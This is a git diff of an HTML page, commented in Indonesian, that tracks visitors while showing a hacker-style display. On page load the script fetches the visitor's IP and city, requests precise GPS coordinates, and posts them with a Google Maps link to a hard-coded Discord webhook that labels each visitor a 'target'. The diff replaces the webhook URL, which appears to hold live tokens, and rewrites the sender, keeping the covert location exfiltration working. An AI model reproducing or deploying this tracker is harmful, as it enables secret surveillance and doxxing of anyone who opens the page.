@@ -24,70 +24,16 @@
 </div>
 
 <canvas id="matrix"></canvas>
-
 <script>
-const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8dj5XnVckc7du-HRYBFKAvdcxZ9jXcZqjJ_5G4hWa1rX0GUPVQ02P5as6o1Ok0xR";
+// WEBHOOK BARU KAMU
+const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
 
-// MATRIX EFFECT
-const canvas = document.getElementById('matrix');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-const letters = "01010101";
-const fontSize = 16;
-const columns = canvas.width / fontSize;
-const drops = Array(Math.floor(columns)).fill(1);
-function drawMatrix() {
-    ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
-    drops.forEach((y, i) => {
-        const text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i * fontSize, y * fontSize);
-        if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-    });
-}
-setInterval(drawMatrix, 40);
-
-// DISCORD SENDER (DENGAN ALERT UNTUK PENGETESAN)
-async function sendToDiscord(data, mapsLink, metode) {
-    const payload = {
-        username: "BASAKENCANA BOT",
-        embeds: [{
-            title: "🎯 TARGET TERDETEKSI",
-            color: 65280,
-            fields: [
-                { name: "🌐 IP Address", value: data.ip, inline: true },
-                { name: "📍 Lokasi", value: `${data.city}, ${data.country_name}`, inline: true },
-                { name: "🎯 Akurasi", value: metode, inline: false },
-                { name: "🗺️ Google Maps", value: mapsLink }
-            ],
-            timestamp: new Date()
-        }]
-    };
-
-    try {
-        const response = await fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-
-        if (response.ok) {
-            console.log("Discord: Success (204)");
-        } else {
-            alert("Discord Error: " + response.status);
-        }
-    } catch (e) {
-        alert("Koneksi ke Discord Gagal!");
-    }
-}
-
-// MAIN TRACKER
 async function trackVisitor() {
     try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
-        
+
+        // Update tampilan web
         document.getElementById('status').innerText = "Target Locked!";
         document.getElementById('ip').innerText = "IP: " + data.ip;
         document.getElementById('location').innerText = "Loc: " + data.city;
@@ -96,23 +42,43 @@ async function trackVisitor() {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                // PERBAIKAN FORMAT LINK DI BAWAH INI ($)
+                // Format Google Maps Link
                 const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
+                // Tampilkan Map di Web
                 var map = L.map('map').setView([lat, lon], 15);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                 L.marker([lat, lon]).addTo(map).bindPopup("Lokasi Akurat").openPopup();
 
-                await sendToDiscord(data, mLink, "GPS (PRESISI)");
+                await sendToDiscord(data, mLink, "🎯 GPS (PRESISI)");
             }, async () => {
                 const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-                await sendToDiscord(data, mLink, "IP (ESTIMASI)");
+                await sendToDiscord(data, mLink, "☁️ IP (ESTIMASI)");
             });
         }
     } catch (err) { console.error(err); }
 }
 
+async function sendToDiscord(data, mapsLink, metode) {
+    const payload = {
+        username: "BASAKENCANA TRACKER",
+        content: `🚨 **PENGUNJUNG TERDETEKSI!**\n` +
+                 `━━━━━━━━━━━━━━━━━━━━\n` +
+                 `🌐 **IP:** ${data.ip}\n` +
+                 `🏙️ **Kota:** ${data.city}, ${data.region}\n` +
+                 `🎯 **Metode:** ${metode}\n` +
+                 `🗺️ **Maps:** ${mapsLink}`
+    };
+
+    await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
+}
+
 trackVisitor();
+
 </script>
 </body>
 </html>
